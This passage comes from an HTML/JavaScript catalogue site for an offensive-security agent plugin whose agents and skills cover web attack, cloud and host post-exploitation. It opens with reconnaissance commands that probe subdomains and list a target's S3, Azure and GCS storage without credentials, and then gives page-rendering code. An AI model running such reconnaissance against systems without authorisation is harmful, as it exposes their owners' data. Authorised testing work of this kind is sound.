subs.txt\ncat subs.txt | httpx -silent -status-code -title | tee live.txt\n\n# Subdomain takeover check → see attack-subdomain-takeover\n\n# Cloud storage checks\n# AWS S3\naws s3 ls s3://TARGET --no-sign-request 2&gt;/dev/null\naws s3 ls s3://TARGET-backup --no-sign-request 2&gt;/dev/null\naws s3 ls s3://TARGET-assets --no-sign-request 2&gt;/dev/null\n\n# Azure Blob\ncurl -s &quot;https://TARGET.blob.core.windows.net/\\$root?restype=container&amp;comp=list&quot;\n\n# GCS\ncurl -s &quot;https://storage.googleapis.com/TARGET&quot;</code></pre><p>For detailed procedures on any test, read: <code>knowledge/web-application/WSTG-INFO/WSTG-INFO-{NN}.md</code> <code>knowledge/web-application/WSTG-CONF/WSTG-CONF-{NN}.md</code> <code>knowledge/web-application/WSTG-ERRH/WSTG-ERRH-{NN}.md</code> <code>knowledge/web-application/WSTG-CRYP/WSTG-CRYP-{NN}.md</code></p>","n":824}],"m":{"name":17,"desc":356,"body":5313,"file":5879,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.8},"name":{"lim":64,"pct":26.6}}}}},"commands":{"analyst":{"slug":"analyst","pillar":"analysts","name":"analyst","description":"Hand an operation to the senior cyber analyst — target picture, method/timing/risk, and the end-neutral loop.","arg":"[what the operation needs decided]","file":"acordia-analysts/commands/analyst.md","dispatches":"cyber-analyst","aliases":["cyber-analyst"],"intro":"<p>Hand the work below to the <code>cyber-analyst</code> agent (ACORDIA Analysis), which orchestrates this pillar.</p><p>It holds the target picture, decides method, timing and risk, and runs the end-neutral loop: did we achieve the effect or collect the intel, and what now. It directs the three analysis legs itself.</p><p><strong>Brief:</strong> $ARGUMENTS</p><p>Dispatch it as a subagent if this harness allows dispatching a primary agent; otherwise switch the session to <code>cyber-analyst</code> and carry the brief across. If the brief is empty, ask what the operation needs before starting — do not invent scope.</p>","secs":[],"m":{"name":7,"desc":109,"body":569,"file":823,"dband":"optimal","bband":"over","ceil":{}}},"cyber-analyst":{"slug":"cyber-analyst","pillar":"analysts","name":"cyber-analyst","description":"Han ","accent":"#c79f6b"},"web-methodology":{"key":"web-methodology","label":"Web methodology","blurb":"Structured web-app testing playbooks (OWASP WSTG) that route to the sharp tools.","members":["recon-methodology","wstg-auth-session","wstg-injection","wstg-logic-client-api","wstg-recon-config"],"pillars":["operators"],"pillar_side":"operators","accent":"#c79f6b"}},"stats":{"agents":9,"skills":81,"commands":18,"families":12,"ported":31,"authored":50,"version":"4.0.0"},"family_order":["analytic-spine","target-modelling","take-handling","defender-reading","evidence-forensics","web-attack","cloud-postexploit","mobile","web-methodology","host-postexploit","directory-attack","operations-discipline"],"command_order":["analyst","cloud","cloud-security","cyber-analyst","cyber-operator","overwatch","overwatch-analyst","fusion","fusion-analyst","internal","internal-network","mobile","mobile-application","operator","target","target-analyst","web-application","webapp"],"sizing":{"bands":{"skills":{"body_c":{"q1":2344,"q3":5313,"med":3544,"lo":0,"hi":9766},"desc_c":{"q1":341,"q3":374,"med":354,"lo":292,"hi":424}},"agents":{"body_c":{"q1":4110,"q3":6116,"med":4811,"lo":1101,"hi":9125},"desc_c":{"q1":206,"q3":237,"med":222,"lo":160,"hi":284}},"commands":{"body_c":{"q1":405,"q3":436,"med":421,"lo":358,"hi":482},"desc_c":{"q1":67,"q3":104,"med":80,"lo":12,"hi":160}}},"ceilings":{"agents":{"body":10000},"skills":{"desc":1024,"name":64}},"totals":{"always_loaded":30184,"always_loaded_tokens":7546,"skill_bodies":327568,"agent_bodies":51791,"command_bodies":7968},"counts":{"skills":{"under":4,"optimal":154,"over":4},"agents":{"under":0,"optimal":15,"over":3},"commands":{"under":0,"optimal":32,"over":4}}}};</script><script>
const D=DATA, A=D.agents, S=D.skills, F=D.families, C=D.commands;
const $=s=>document.querySelector(s), ce=(t,c)=>{const e=document.createElement(t);if(c)e.className=c;return e;};
const esc=s=>(s||"").replace(/[&<>"]/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[m]));
const PILL={analysts:{label:"Analysis",accent:"var(--analysis)"},operators:{label:"Operations",accent:"var(--operations)"}};
const go=h=>{location.hash=h;};

/* ---------- chips ---------- */
function agentChip(slug,extra){const a=A[slug];if(!a)return"";
 return `<a class="chip" href="#/agent/${slug}"><span class="dot" style="background:${a.accent}"></span>
  <span>${esc(a.name)}</span><span class="des">${a.designator}</span>${extra?`<span class="sub">${esc(extra)}</span>`:""}</a>`;}
function skillChip(slug){const s=S[slug];if(!s)return"";const f=F[s.family];
 return `<a class="chip" href="#/skill/${slug}"><span class="dot" style="background:${f.accent}"></span>
  <span class="mono" style="font-size:12.5px">${esc(s.slug)}</span>${s.ported?'<span class="des">ported</span>':''}</a>`;}
function famChip(k){const f=F[k];return `<a class="chip" href="#/family/${k}"><span class="bar" style="width:3px;height:13px;border-radius:3px;background:${f.accent}"></span><span>${esc(f.label)}</span><span class="sub">${f.members.length}</span></a>`;}
function cmdChip(slug){const c=C[slug];return `<a class="chip" href="#/command/${slug}"><span class="mono">/${esc(slug)}</span></a>`;}

/* ---------- overview / map ---------- */
function nodeHTML(slug){const a=A[slug];const lead=a.is_lead;
 return `<a class="node ${lead?'lead':''}" data-node="${slug}" href="#/agent/${slug}" style="--nc:${a.accent}">
   <div class="nr"><span class="dot" style="background:${a.accent}"></span>
     <span class="nm">${esc(a.name)}</span>
     ${lead?`<span class="leadtag" style="color:${a.accent}">lead</span>`:''}
     <span class="des">${a.designator}</span></div>
   <div class="role">${esc(a.role)}</div></a>`;}

function pillarCol(pk){const p=D.pillars[pk];const lead=p.order[0];const specs=p.order.slice(1);
 return `<div class="pillar-col ${pk}"><svg class="wires"></svg>
   <div class="phead">
     <span class="tag" style="color:${PILL[pk].accent};border:1px solid ${PILL[pk].accent}55;background:${pk=='analysts'?'#0d2b2955':'#2b1f0d55'}">${PILL[pk].label}</span>
     <span class="tl">${esc(p.tagline)} · ${p.agents.length} agents · ${p.skills.length} skills</span>
   </div>
   ${nodeHTML(lead)}
   <div class="spec-grid">${specs.map(nodeHTML).join("")}</div>
 </div>`;}

function renderOverview(){
 const s=D.stats;
 const board=`<div class="board">${pillarCol('analysts')}${pillarCol('operators')}</div>`;
 const rack=`<div class="families-rack">
    <div class="rh"><span class="eyebrow">Skill library · 12 families · ${s.skills} skills</span></div>
    <div class="fam-grid">${D.family_order.map(k=>{const f=F[k];
      return `<a class="fam-chip" href="#/family/${k}" style="--fc:${f.accent}">
        <div class="ft"><span class="bar"></span><span class="fn">${esc(f.label)}</span><span class="fc">${f.members.length}</span></div>
        <div class="fb">${esc(f.blurb)}</div></a>`;}).join("")}</div></div>`;
 const legend=`<div class="legend">
    <span class="li"><span class="sw" style="background:var(--analysis)"></span>Analysis pillar</span>
    <span class="li"><span class="sw" style="background:var(--operations)"></span>Operations pillar</span>
    <span class="li"><span class="ln" style="border-color:var(--mut2)"></span>directs (orchestration)</span>
    <span class="li"><span class="ln dash" style="border-color:var(--mut2)"></span>hands off to</span>
    <span class="li"><span class="sw" style="background:var(--authored)"></span>authored (${s.authored})</span>
    <span class="li"><span class="sw" style="background:var(--ported)"></span>ported from CyberStrike (${s.ported})</span>
 </div>`;
 $("#main").innerHTML=`<section class="hero"><div class="wrap">
    <div class="eyebrow">ACORDIA · v${s.version} · a markdown-only agent plugin for omp &amp; Claude Code</div>
    <h1>Two pillars: analysts that judge, operators that act.</h1>
    <p class="lede">ACORDIA is a security team you dispatch. A lead in each pillar orchestrates a handful of specialist agents; every agent draws on a shared library of ${s.skills} tradecraft skills. Click any node to drill in — everything is cross-linked.</p>
    ${legend}
    ${board}
    ${rack}
 </div></section>`;
 setCrumbs([["Overview",""]]);
 requestAnimationFrame(drawWires);
}

const HIER={}; Object.values(A).forEach(a=>{if(a.directs&&a.directs.length)HIER[a.slug]=a.directs;});
function drawWires(){
 document.querySelectorAll('.pillar-col').forEach(col=>{
   const svg=col.querySelector('svg.wires'); if(!svg)return; const cr=col.getBoundingClientRect();
   const pt=id=>{const n=col.querySelector(`[data-node="${id}"]`); if(!n)return null; const r=n.getBoundingClientRect();
     return {x:r.left-cr.left+r.width/2, top:r.top-cr.top, bot:r.bottom-cr.top, left:r.left-cr.left, right:r.right-cr.left, cy:r.top-cr.top+r.height/2};};
   let paths="";
   Object.entries(HIER).forEach(([lead,kids])=>{const p=pt(lead);if(!p)return;const acc=A[lead].accent;
     const spineX=18; const kc=kids.map(pt).filter(Boolean); if(!kc.length)return;
     const yTop=p.bot+15, yBot=Math.max(...kc.map(c=>c.cy));
     paths+=`<path class="wire" stroke="${acc}" d="M ${p.x} ${p.bot} C ${p.x} ${p.bot+13}, ${spineX} ${p.bot}, ${spineX} ${yTop}"/>`;
     paths+=`<path class="wire" stroke="${acc}" d="M ${spineX} ${yTop} L ${spineX} ${yBot}"/>`;
     kc.forEach(c=>{paths+=`<path class="wire" stroke="${acc}" d="M ${spineX} ${c.cy} L ${c.left-1} ${c.cy}"/>`;});
   });
   Object.values(A).forEach(a=>{(a.handoff_to||[]).forEach(t=>{const s1=pt(a.slug),s2=pt(t);if(!s1||!s2)return;
     const rx=Math.min(cr.width-4, Math.max(s1.right,s2.right)+12);
     paths+=`<path class="wire dash" stroke="var(--mut)" d="M ${s1.right} ${s1.cy} C ${rx} ${s1.cy}, ${rx} ${s2.cy}, ${s2.right} ${s2.cy}"/>`;});});
   svg.innerHTML=paths; svg.setAttribute("viewBox",`0 0 ${cr.width} ${cr.height}`);
 });
}
addEventListener("resize",()=>{clearTimeout(window.__t);window.__t=setTimeout(drawWires,120);});

/* ---------- agent page ---------- */
function renderAgent(slug){const a=A[slug];if(!a)return render404();
 const p=D.pillars[a.pillar];
 const cmds=Object.values(C).filter(c=>c.dispatches===slug).map(c=>c.slug);
 const skills=a.skills_named||[];
 // group named skills by family
 const byFam={};skills.forEach(k=>{const f=S[k]?.family||"?";(byFam[f]=byFam[f]||[]).push(k);});
 let orch="";
 if(a.directs&&a.directs.length) orch+=block("Directs these specialists", a.directs.map(x=>agentChip(x)).join(""));
 if(a.directed_by&&a.directed_by.length) orch+=block("Reports to", a.directed_by.map(x=>agentChip(x)).join(""));
 if(a.handoff_to&&a.handoff_to.length) orch+=block("Hands off to", a.handoff_to.map(x=>agentChip(x,"for backend-only web surfaces")).join(""));
 const skillSecs=Object.keys(byFam).sort((x,y)=>byFam[y].length-byFam[x].length).map(f=>
   `<div style="margin-bottom:14px"><div class="eyebrow" style="margin-bottom:8px;color:${F[f]?.accent||'var(--mut2)'}">${esc(F[f]?.label||f)}</div>
    <div class="chips">${byFam[f].map(skillChip).join("")}</div></div>`).join("");
 $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick">
     <span class="badge pill-${a.pillar}"><span class="d" style="background:${PILL[a.pillar].accent}"></span>${PILL[a.pillar].label}</span>
     <span class="badge"><span class="d" style="background:${a.accent}"></span>${a.designator}${a.is_lead?' · pillar lead':' · specialist'}</span>
   </div>
   <h1>${esc(a.name)}</h1>
   <p class="desc">${esc(a.description)}</p>
   ${orch?`<div class="section"><h3>Orchestration</h3>${orch}</div>`:""}
   ${cmds.length?`<div class="section"><h3>Launch it</h3><div class="chips">${cmds.map(cmdChip).join("")}</div></div>`:""}
   ${skills.length?`<div class="section"><h3>Routes to ${skills.length} skills</h3>${skillSecs}</div>`:`<div class="section"><h3>Skills</h3><p class="empty">This agent surfaces skills by description match rather than naming them in its prompt.</p></div>`}
   <div class="section"><h3>From the agent prompt</h3><div class="excerpt">${esc(a.excerpt)}</div>
     <div class="filepath" style="margin-top:10px">${esc(a.file)}</div></div>
   ${sizeBlock(a,"agents")}
   ${proseBlock(a)}
 </div></section>`;
 setCrumbs([["Overview",""],[PILL[a.pillar].label,"/pillar/"+a.pillar],[a.name,null]]);
}
function block(title,inner){return `<div style="margin-bottom:14px"><div class="eyebrow" style="margin-bottom:8px">${title}</div><div class="chips">${inner}</div></div>`;}


function proseBlock(r){
 const secs=r.secs||[], n=secs.length;
 if(!n && !r.intro) return "";
 const ctl = n>1?`<div class="pctl"><button type=button onclick="allSecs(1)">expand all</button><button type=button onclick="allSecs(0)">collapse all</button></div>`:'';
 const head=`<div class="section"><div class="prose-head"><h3>Full document${n?` · ${n} section${n==1?'':'s'}`:''}</h3>${ctl}</div>`;
 const intro=r.intro?`<div class="prose">${r.intro}</div>`:'';
 const body=secs.map(s=>`<details class="sec"><summary><span class="sx">\u25b8</span>${esc(s.t)}<span class="sn">${(s.n||0).toLocaleString()} chars</span></summary><div class="prose">${s.h}</div></details>`).join("");
 return head+intro+body+`</div>`;
}
function allSecs(open){document.querySelectorAll("details.sec").forEach(d=>{d.open=!!open;});}
/* ---------- skill page ---------- */
function renderSkill(slug){const s=S[slug];if(!s)return render404();const f=F[s.family];
 const users=s.used_by||[];
 const sibs=f.members.filter(m=>m!==slug);
 let prov;
 if(s.ported){prov=`<span class="badge ported">ported from CyberStrike</span>`;}
 else {prov=`<span class="badge authored">authored for ACORDIA</span>`;}
 $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick">
     <a class="badge" href="#/family/${s.family}" style="color:${f.accent};border-color:${f.accent}55"><span class="d" style="background:${f.accent}"></span>${esc(f.label)}</a>
     <span class="badge pill-${s.pillar}"><span class="d" style="background:${PILL[s.pillar].accent}"></span>${PILL[s.pillar].label}</span>
     ${prov}
   </div>
   <h1 class="mono" style="font-size:23px">${esc(s.slug)}</h1>
   <p class="desc">${esc(s.description)}</p>
   <div class="section"><h3>What it does</h3><div class="excerpt">${esc(s.summary)||'<span class="empty">See skill file.</span>'}</div></div>
   <div class="section"><h3>Named by ${users.length} agent${users.length==1?'':'s'}</h3>
     ${users.length?`<div class="chips">${users.map(u=>agentChip(u)).join("")}</div>`:'<p class="empty">No agent names this skill directly — it surfaces to any agent by description match.</p>'}</div>
   <div class="section"><h3>${sibs.length} more in ${esc(f.label)}</h3><div class="chips">${sibs.map(skillChip).join("")}</div></div>
   <div class="section"><h3>Provenance</h3>
     <div class="meta-row">
       ${s.ported?`<span>origin <b>CyberStrike</b> commit <b>359655518</b></span>`:`<span>origin <b>authored for ACORDIA</b></span>`}
       ${s.source?`<span>derived from <b>${esc(s.source)}</b></span>`:''}
     </div>
     <div class="filepath" style="margin-top:10px">${esc(s.file)}</div></div>
   ${sizeBlock(s,"skills")}
   ${proseBlock(s)}
 </div></section>`;
 setCrumbs([["Overview",""],[f.label,"/family/"+s.family],[s.slug,null]]);
}

/* ---------- family page ---------- */
function renderFamily(k){const f=F[k];if(!f)return render404();
 const cards=f.members.map(m=>{const s=S[m];
   return `<a class="card" href="#/skill/${m}"><div class="ct"><span class="bar" style="background:${f.accent}"></span>
     <span class="cn mono" style="font-size:13px">${esc(s.slug)}</span>${s.ported?'<span class="badge ported" style="margin-left:auto;font-size:9.5px;padding:1px 7px">ported</span>':'<span class="badge authored" style="margin-left:auto;font-size:9.5px;padding:1px 7px">authored</span>'}</div>
     <div class="cd">${esc(clip(s.description,150))}</div></a>`;}).join("");
 const side=f.pillar_side;
 $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick"><span class="badge" style="color:${f.accent};border-color:${f.accent}55"><span class="d" style="background:${f.accent}"></span>family</span>
     ${side!=='both'?`<span class="badge pill-${side}"><span class="d" style="background:${PILL[side].accent}"></span>${PILL[side].label}</span>`:'<span class="badge">spans both pillars</span>'}
     <span class="badge">${f.members.length} skills</span></div>
   <h1>${esc(f.label)}</h1>
   <p class="desc">${esc(f.blurb)}</p>
   <div class="section"><h3>Skills in this family</h3><div class="grid-cards">${cards}</div></div>
 </div></section>`;
 setCrumbs([["Overview",""],[f.label,null]]);
}

/* ---------- command + indexes ---------- */
function renderCommand(slug){const c=C[slug];if(!c)return render404();const tgt=c.dispatches;
 $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick"><span class="badge pill-${c.pillar}"><span class="d" style="background:${PILL[c.pillar].accent}"></span>${PILL[c.pillar].label}</span><span class="badge">slash command</span></div>
   <h1 class="mono">/${esc(slug)}${c.arg?` <span style="color:var(--mut2);font-size:16px">${esc(c.arg)}</span>`:''}</h1>
   <p class="desc">${esc(c.description)}</p>
   <div class="section"><h3>Dispatches</h3><div class="chips">${tgt?agentChip(tgt):'<span class="empty">—</span>'}</div></div>
   ${c.aliases&&c.aliases.length?`<div class="section"><h3>Aliases</h3><div class="chips">${c.aliases.map(cmdChip).join("")}</div></div>`:''}
   <div class="filepath">${esc(c.file)}</div>
   ${sizeBlock(c,"commands")}
   ${proseBlock(c)}
 </div></section>`;
 setCrumbs([["Overview",""],["Commands","/commands"],["/"+slug,null]]);
}
function renderSkillsIndex(){
 const secs=D.family_order.map(k=>{const f=F[k];
   return `<div class="section"><h3 style="color:${f.accent}"><a href="#/family/${k}">${esc(f.label)}</a> · ${f.members.length}</h3>
     <div class="grid-cards">${f.members.map(m=>{const s=S[m];
       return `<a class="card" href="#/skill/${m}"><div class="ct"><span class="bar" style="background:${f.accent}"></span><span class="cn mono" style="font-size:13px">${esc(s.slug)}</span></div><div class="cd">${esc(clip(s.description,140))}</div></a>`;}).join("")}</div></div>`;}).join("");
 $("#main").innerHTML=`<section class="page"><div class="wrap"><div class="eyebrow">Skill library</div><h1>All ${D.stats.skills} skills</h1>${secs}</div></section>`;
 setCrumbs([["Overview",""],["All skills",null]]);
}
function renderCommandsIndex(){
 const cards=D.command_order.map(slug=>{const c=C[slug];
   return `<a class="card" href="#/command/${slug}"><div class="ct"><span class="cn mono">/${esc(slug)}</span></div><div class="cd">${esc(clip(c.description,140))}</div></a>`;}).join("");
 $("#main").innerHTML=`<section class="page"><div class="wrap"><div class="eyebrow">Entry points</div><h1>All ${D.stats.commands} commands</h1><div class="section"><div class="grid-cards">${cards}</div></div></div></section>`;
 setCrumbs([["Overview",""],["Commands",null]]);
}
function renderPillar(pk){const p=D.pillars[pk];if(!p)return render404();
 const agents=p.order.map(s=>`<a class="card" href="#/agent/${s}"><div class="ct"><span class="bar" style="background:${A[s].accent}"></span><span class="cn">${esc(A[s].name)}</span><span class="des" style="margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--mut2)">${A[s].designator}</span></div><div class="cd">${esc(A[s].role)}</div></a>`).join("");
 $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick"><span class="badge pill-${pk}"><span class="d" style="background:${PILL[pk].accent}"></span>${PILL[pk].label} pillar</span><span class="badge">${p.agents.length} agents</span><span class="badge">${p.skills.length} skills</span></div>
   <h1>${esc(p.label)}</h1><p class="desc">${esc(p.description)}</p>
   <div class="section"><h3>Agents</h3><div class="grid-cards">${agents}</div></div></div></section>`;
 setCrumbs([["Overview",""],[p.label,null]]);
}

/* ---------- sizing ---------- */
const SZ=D.sizing;
function szFill(cls,pct){return `<div class="szfill ${cls}" style="width:${Math.max(1.5,Math.min(100,pct))}%"></div>`;}
function szBar(kind,field,val,band,ceil){
  const b=SZ.bands[kind][field==='desc'?'desc_c':'body_c'];
  const scaleMax=ceil?ceil.lim:Math.max(b.hi*1.15,val*1.05);
  let cls=band, pct=val/scaleMax*100;
  if(ceil&&ceil.pct>=95) cls='crit';
  const marks=[];
  if(ceil) marks.push(`<span class="szmark" style="left:100%" data-l="${ceil.lim.toLocaleString()} spec"></span>`);
  else marks.push(`<span class="szmark" style="left:${Math.min(99,b.hi/scaleMax*100)}%" data-l="peer ${b.hi.toLocaleString()}"></span>`);
  const label=ceil?`${val.toLocaleString()} · ${ceil.pct}%`:val.toLocaleString()+" ch";
  return `<div class="szrow"><span class="szlab">${field}</span>
    <div class="szbar">${szFill(cls,pct)}${marks.join("")}</div>
    <span class="szval">${label}</span><span class="szchip ${cls}">${cls==='crit'?'at ceiling':cls}</span></div>`;
}
function sizeBlock(r,kind){
  if(!r.m) return "";
  const m=r.m, ce=m.ceil||{};
  let rows=szBar(kind,'desc',m.desc,m.dband,ce.desc)+szBar(kind,'body',m.body,m.bband,ce.body);
  const notes=[];
  if(ce.body) notes.push(`Spec ceiling ${ce.body.lim.toLocaleString()} characters on an agent prompt body (agent-roster). This one uses <b>${ce.body.pct}%</b>.`);
  if(ce.desc) notes.push(`Spec ceiling ${ce.desc.lim.toLocaleString()} characters on a skill description. This one uses <b>${ce.desc.pct}%</b>.`);
  notes.push(`<b>Peer band</b> is this library's own distribution, Tukey 1.5&times;IQR: ${kind} bodies sit between ${SZ.bands[kind].body_c.lo.toLocaleString()} and ${SZ.bands[kind].body_c.hi.toLocaleString()} characters, median ${SZ.bands[kind].body_c.med.toLocaleString()}. Outside that is flagged, not wrong.`);
  if(kind==='skills') notes.push(`The description is <b>always loaded</b> — both harnesses list every skill's name and description in the system prompt. The body is read only when the skill is invoked.`);
  return `<div class="section"><h3>Size</h3>${rows}<div class="sznote">${notes.join("<br>")}</div></div>`;
}
function renderSizes(){
  const T=SZ.totals;
  const all=[];
  [['skills',S],['agents',A],['commands',C]].forEach(([k,src])=>Object.keys(src).forEach(s=>{
    const r=src[s]; if(r.m) all.push({kind:k,slug:s,r});}));
  const flagged=all.filter(x=>x.r.m.bband!=='optimal'||x.r.m.dband!=='optimal');
  const ceilPress=all.filter(x=>x.r.m.ceil&&x.r.m.ceil.body).sort((a,b)=>b.r.m.ceil.body.pct-a.r.m.ceil.body.pct);
  const route=k=>k==='skills'?'skill':k==='agents'?'agent':'command';
  const item=x=>{const m=x.r.m,ce=m.ceil||{},b=SZ.bands[x.kind].body_c;
    const scaleMax=ce.body?ce.body.lim:Math.max(b.hi*1.15,m.body*1.05);
    let cls=m.bband; if(ce.body&&ce.body.pct>=95)cls='crit';
    return `<div class="szitem"><a href="#/${route(x.kind)}/${x.slug}">${esc(x.slug)}</a>
      <div class="szbar">${szFill(cls,m.body/scaleMax*100)}${ce.body?`<span class="szmark" style="left:100%"></span>`:`<span class="szmark" style="left:${Math.min(99,b.hi/scaleMax*100)}%"></span>`}</div>
      <span class="szval">${m.body.toLocaleString()} ch</span><span class="szchip ${cls}">${cls==='crit'?'at ceiling':cls}</span></div>`;};
  $("#main").innerHTML=`<section class="page"><div class="wrap">
   <div class="kick"><span class="badge">measured from disk</span></div>
   <h1>Size &amp; budget</h1>
   <p class="desc">What every artefact costs, against two yardsticks: the hard ceilings the specs state, and the peer band this library's own distribution implies.</p>
   <div class="szhead">
     <div class="szcard"><b>${T.always_loaded.toLocaleString()}</b><span>always-loaded chars</span></div>
     <div class="szcard"><b>~${T.always_loaded_tokens.toLocaleString()}</b><span>tokens every session</span></div>
     <div class="szcard"><b>${T.skill_bodies.toLocaleString()}</b><span>skill bodies, on demand</span></div>
     <div class="szcard"><b>${T.agent_bodies.toLocaleString()}</b><span>agent prompts</span></div>
     <div class="szcard"><b>${T.command_bodies.toLocaleString()}</b><span>command wrappers</span></div>
   </div>
   <div class="section"><h3>The one hard ceiling under pressure</h3>
     ${ceilPress.slice(0,4).map(item).join("")}
     <div class="sznote">Only agent prompt bodies carry a spec ceiling — 10,000 characters, <b>agent-roster</b>. The marker sits at the limit, so a full bar is a violation. Skill descriptions are capped at 1,024 and the worst uses 43%, so they are not shown here.</div></div>
   <div class="section"><h3>${flagged.length} outside the peer band</h3>
     <div class="sznote" style="margin:0 0 10px">Flagged against this library's own distribution, not an external ideal. <b>Over</b> is fatter than 1.5&times;IQR above the third quartile; <b>under</b> is thinner than the same distance below the first.</div>
     ${flagged.sort((a,b)=>b.r.m.body-a.r.m.body).map(item).join("")}</div>
   <div class="section"><h3>Everything, by body size</h3>
     <div class="sztabs">${['all','skills','agents','commands'].map(k=>`<button type=button data-k="${k}" onclick="szTab('${k}')" class="${k==='all'?'on':''}">${k}</button>`).join("")}</div>
     <div class="szlist" id="szall">${all.sort((a,b)=>b.r.m.body-a.r.m.body).map(x=>`<div data-kind="${x.kind}">${item(x)}</div>`).join("")}</div></div>
  </div></section>`;
  setCrumbs([["Overview",""],["Size & budget",null]]);
}
function szTab(k){
  document.querySelectorAll('.sztabs button').forEach(b=>b.classList.toggle('on',b.dataset.k===k));
  document.querySelectorAll('#szall > div').forEach(d=>{d.style.display=(k==='all'||d.dataset.kind===k)?'':'none';});
}
function render404(){$("#main").innerHTML=`<section class="page"><div class="wrap"><h1>Not found</h1><p class="desc"><a href="#">Back to the map</a></p></div></section>`;}
const clip=(s,n)=>{s=s||"";return s.length>n?s.slice(0,n).replace(/\s+\S*$/,"")+"…":s;};

/* ---------- search ---------- */
const INDEX=[
 ...Object.values(A).map(a=>({t:"agent",slug:a.slug,name:a.name,sub:PILL[a.pillar].label+" · agent",desc:a.description,hash:"/agent/"+a.slug,accent:a.accent})),
 ...Object.values(S).map(s=>({t:"skill",slug:s.slug,name:s.slug,sub:F[s.family].label+(s.ported?" · ported":" · authored"),desc:s.description,hash:"/skill/"+s.slug,accent:F[s.family].accent})),
 ...Object.values(F).map(f=>({t:"family",slug:f.key,name:f.label,sub:f.members.length+" skills",desc:f.blurb,hash:"/family/"+f.key,accent:f.accent})),
 ...Object.values(C).map(c=>({t:"command",slug:c.slug,name:"/"+c.slug,sub:"command",desc:c.description,hash:"/command/"+c.slug,accent:"var(--mut)"})),
];
function hl(txt,q){if(!q)return esc(clip(txt,90));const i=txt.toLowerCase().indexOf(q);if(i<0)return esc(clip(txt,90));
 const a=Math.max(0,i-24);return (a>0?"…":"")+esc(txt.slice(a,i))+"<mark>"+esc(txt.slice(i,i+q.length))+"</mark>"+esc(clip(txt.slice(i+q.length),50));}
function runSearch(q){q=q.trim().toLowerCase();
 if(!q){if(location.hash==="#/search")go("");return;}
 const hits=INDEX.map(x=>{const hay=(x.name+" "+x.slug+" "+x.sub+" "+x.desc).toLowerCase();
   let sc=-1; if(x.slug.toLowerCase()===q)sc=100; else if(x.name.toLowerCase().includes(q))sc=60; else if(x.slug.toLowerCase().includes(q))sc=55; else if(hay.includes(q))sc=20;
   return {x,sc};}).filter(h=>h.sc>0).sort((a,b)=>b.sc-a.sc);
 const groups={agent:[],skill:[],family:[],command:[]};hits.forEach(h=>groups[h.x.t].push(h.x));
 const LBL={agent:"Agents",skill:"Skills",family:"Families",command:"Commands"};
 let html=`<div class="results"><div class="wrap"><div class="eyebrow">${hits.length} result${hits.length==1?'':'s'} for “${esc(q)}”</div>`;
 for(const t of ["agent","skill","family","command"]){if(!groups[t].length)continue;
   html+=`<div class="rg"><div class="eyebrow" style="margin-bottom:6px">${LBL[t]} · ${groups[t].length}</div>`;
   html+=groups[t].map(x=>`<a class="rc" href="#${x.hash}"><span class="dot" style="width:8px;height:8px;border-radius:50%;background:${x.accent};flex:none"></span><span class="nm ${t=='skill'||t=='command'?'mono':''}">${esc(x.name)}</span><span class="rd">${hl(x.desc,q)}</span></a>`).join("");
   html+=`</div>`;}
 if(!hits.length)html+=`<p class="empty" style="padding:20px 0">No matches. Try an agent name, a skill slug, or a technique keyword.</p>`;
 $("#main").innerHTML=html+`</div></div>`;
 setCrumbs([["Overview",""],["Search",null]]);
}

/* ---------- crumbs + nav + router ---------- */
function setCrumbs(items){$("#crumbs").innerHTML=items.map((it,i)=>{
  const [label,h]=it;const last=i===items.length-1;
  const link=h===null?`<span>${esc(label)}</span>`:`<a href="#${h}">${esc(label)}</a>`;
  return (i?`<span class="sep">/</span>`:"")+link;}).join("");}
function buildNav(){
 const g=(t)=>`<div class="grp">${t}</div>`;
 let h=`<a href="#" data-h="">◆ Overview — the map</a>`;
 h+=g("Analysis · brain");
 h+=D.pillars.analysts.order.map(s=>navA(s)).join("");
 h+=g("Operations · hands");
 h+=D.pillars.operators.order.map(s=>navA(s)).join("");
 h+=g("Skill families");
 h+=D.family_order.map(k=>{const f=F[k];return `<a href="#/family/${k}" data-h="/family/${k}"><span class="dot" style="background:${f.accent}"></span>${esc(f.label)}<span class="cnt">${f.members.length}</span></a>`;}).join("");
 h+=g("Browse");
 h+=`<a href="#/skills" data-h="/skills">▤ All skills<span class="cnt">${D.stats.skills}</span></a>`;
 h+=`<a href="#/commands" data-h="/commands">▤ All commands<span class="cnt">${D.stats.commands}</span></a>`;
 h+=`<a href="#/sizes" data-h="/sizes">▤ Size &amp; budget</a>`;
 $("#nav").innerHTML=h;
}
function navA(s){const a=A[s];return `<a href="#/agent/${s}" data-h="/agent/${s}"><span class="dot" style="background:${a.accent}"></span>${esc(a.name)}<span class="des">${a.designator}</span></a>`;}
function markNav(hash){document.querySelectorAll("#nav a").forEach(el=>el.classList.toggle("on",el.getAttribute("data-h")===hash));}

function router(){const h=location.hash.replace(/^#/,"")||"";
 const parts=h.split("/").filter(Boolean);
 window.scrollTo(0,0);
 if(!parts.length){renderOverview();markNav("");}
 else if(parts[0]==="agent"){renderAgent(parts[1]);markNav("/agent/"+parts[1]);}
 else if(parts[0]==="skill"){renderSkill(parts[1]);markNav("");}
 else if(parts[0]==="family"){renderFamily(parts[1]);markNav("/family/"+parts[1]);}
 else if(parts[0]==="command"){renderCommand(parts[1]);markNav("");}
 else if(parts[0]==="pillar"){renderPillar(parts[1]);markNav("");}
 else if(parts[0]==="skills"){renderSkillsIndex();markNav("/skills");}
 else if(parts[0]==="commands"){renderCommandsIndex();markNav("/commands");}
 else if(parts[0]==="sizes"){renderSizes();markNav("/sizes");}
 else if(parts[0]==="search"){runSearch($("#q").value);markNav("");}
 else render404();
}
addEventListener("hashchange",router);
addEventListener("DOMContentLoaded",()=>{
 buildNav();
 const q=$("#q");
 q.addEventListener("input",()=>{if(q.value.trim()){if(location.hash!=="#/search")location.hash="#/search";else runSearch(q.value);}else if(location.hash==="#/search")go("");});
 addEventListener("keydown",e=>{if(e.key==="/"&&document.activeElement!==q){e.preventDefault();q.focus();}
   if(e.key==="Escape"&&document.activeElement===q){q.value="";q.blur();if(location.hash==="#/search")go("");}});
 router();
});
</script></body></html>
